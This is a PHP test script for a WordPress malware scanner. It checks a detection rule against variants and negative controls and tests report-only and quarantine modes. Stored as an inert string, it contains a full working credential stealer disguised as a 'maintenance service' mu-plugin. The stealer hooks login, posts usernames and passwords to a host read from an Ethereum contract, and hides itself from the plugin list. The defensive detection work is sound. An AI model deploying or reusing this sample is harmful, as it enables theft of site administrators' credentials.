<?php
// The sample is written as inert text and scanned, never included or executed.
$repo = dirname(__DIR__, 2);
$ruleId = 'PHP_WP_MAINTENANCE_CREDENTIAL_STEALER_001';
$sample = <<<'SAMPLE'
<?php
/**
 * Plugin Name: maintenance service
 */
add_action('wp_authenticate', 'enqueue_maintenance', 1, 2);
function enqueue_maintenance($user_login, $user_password) {
    if ($_SERVER['REQUEST_METHOD'] !== 'POST' || $user_login === '' || $user_password === '') {
        return null;
    }
    $maint = getMaintenance();
    if (!$maint) { return null; }
    $h = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '';
    $user = get_user_by('login', $user_login);
    if (!$user && is_email($user_login)) { $user = get_user_by('email', $user_login); }
    if ($user && wp_check_password($user_password, $user->user_pass, $user->ID)) {
        wp_remote_post('http://'.$maint.'/api/success', [
            'sslverify' => false,
            'headers' => ['Content-Type' => 'application/json'],
            'body' => json_encode(['username' => $user_login, 'pwd' => $user_password, 'host' => $h]),
        ]);
        return;
    }
    wp_remote_post('http://'.$maint.'/api/add', [
        'sslverify' => false,
        'headers' => ['Content-Type' => 'application/json'],
        'body' => json_encode(['username' => $user_login, 'pwd' => $user_password, 'host' => $h]),
    ]);
}
add_filter('plugins_list', function ($plugins) {
    $self = basename(__FILE__);
    if (isset($plugins['mustuse'])) {
        foreach ($plugins['mustuse'] as $file => $data) {
            if (basename($file) === $self) { unset($plugins['mustuse'][$file]); break; }
        }
    }
    return $plugins;
});
function getMaintenance() {
    $response = wp_remote_post('https://ethereum-sepolia-rpc.publicnode.com', [
        'headers' => ['Content-Type' => 'application/json'],
        'body' => wp_json_encode([
            'jsonrpc' => '2.0', 'method' => 'eth_call',
            'params' => [['to' => '0x59C90076a20619731897728915Fe1dA2fbc9fa2e', 'data' => '0xb68d1809'], 'latest'],
            'id' => 1,
        ]),
        'timeout' => 15,
    ]);
    if (is_wp_error($response)) { return null; }
    $body = wp_remote_retrieve_body($response);
    if (!$body) { return null; }
    $data = json_decode($body, true);
    if (!is_array($data)) { return null; }
    $hex = $data['result'] ?? null;
    if (!$hex || !is_string($hex) || strlen($hex) < 130) { return null; }
    $hex = substr($hex, 2);
    $offset = hexdec(substr($hex, 0, 64)) * 2;
    $length = hexdec(substr($hex, $offset, 64));
    return hex2bin(substr($hex, $offset + 64, $length * 2));
}
SAMPLE;
function check($condition, $message) {
    if (!$condition) { throw new RuntimeException($message); }
}
$rules = json_decode(file_get_contents($repo . '/intel/patterns/php-malware-rules.json'), true, 512, JSON_THROW_ON_ERROR);
$rule = array_values(array_filter($rules['rules'], fn($r) => $r['id'] === $ruleId))[0];
$regex = '~' . $rule['pattern'] . '~i';
check(preg_match($regex, $sample) === 1, 'Sample must match');
$renamed = str_replace(['enqueue_maintenance', 'getMaintenance', '$user_password', '0x59C90076a20619731897728915Fe1dA2fbc9fa2e'], ['login_callback', 'lookup_host', '$secret', '0x1111111111111111111111111111111111111111'], $sample);
check(preg_match($regex, $renamed) === 1, 'Renamed functions, password variable and contract must match');
check(preg_match($regex, str_replace("'", '"', $renamed)) === 1, 'Double-quoted variant must match');
foreach (['wp_authenticate', 'wp_check_password', 'eth_call', 'plugins_list', 'unset'] as $required) {
    check(preg_match($regex, str_replace($required, 'benign_placeholder', $sample)) === 0, 'Incomplete behavior must not match: ' . $required);
}
check(preg_match($regex, str_replace("'pwd' => \$user_password", "'pwd' => '[redacted]'", $sample)) === 0, 'Redacted password must not match');
check(preg_match($regex, "<?php add_action('wp_authenticate', 'audit_login', 1, 2); wp_remote_post('https://example.invalid', ['body' => 'login event']);") === 0, 'Benign login audit must not match');

$base = sys_get_temp_dir() . '/warden-maintenance-test-' . bin2hex(random_bytes(6));
foreach (['report', 'quarantine'] as $mode) {
    $root = $base . '/' . $mode;
    mkdir($root . '/wp-content/mu-plugins', 0700, true);
    $path = $root . '/wp-content/mu-plugins/maintenance.php';
    file_put_contents($path, $sample);
    $report = $base . '/' . $mode . '.json';
    $quarantine = $base . '/quarantined';
    $args = [PHP_BINARY, $repo . '/scanner/wp-warden-pef.php', $root,
        '--intel-dir=' . $repo . '/intel', '--noninteractive', '--no-file-cache', '--quiet', '--report-json=' . $report];
    if ($mode === 'quarantine') {
        $args = array_merge($args, ['--apply', '--quarantine-malware-auto', '--quarantine=' . $quarantine]);
    }
    exec(implode(' ', array_map('escapeshellarg', $args)) . ' 2>&1', $output, $exit);
    check(is_file($report), 'Scanner must produce report: ' . implode("\n", $output));
    $result = json_decode(file_get_contents($report), true, 512, JSON_THROW_ON_ERROR);
    $hits = array_values(array_filter($result['findings'], fn($f) => ($f['rule_id'] ?? '') === $ruleId));
    check(count($hits) === 1 && $hits[0]['severity'] === 'critical', 'Scanner must emit a critical finding in ' . $mode);
    check(is_file($path) === ($mode === 'report'), 'Report mode preserves file; cleanup removes active file');
    if ($mode === 'quarantine') {
        $preserved = false;
        foreach (new RecursiveIteratorIterator(new RecursiveDirectoryIterator($quarantine, FilesystemIterator::SKIP_DOTS)) as $file) {
            if ($file->isFile() && hash_file('sha256', $file->getPathname()) === hash('sha256', $sample)) { $preserved = true; }
        }
        check($preserved, 'Quarantine must preserve the original bytes');
    }
}
echo "PASS maintenance stealer detection, variants, negative controls, report-only and automatic quarantine\n";
echo "Inert test artifacts: $base\n";
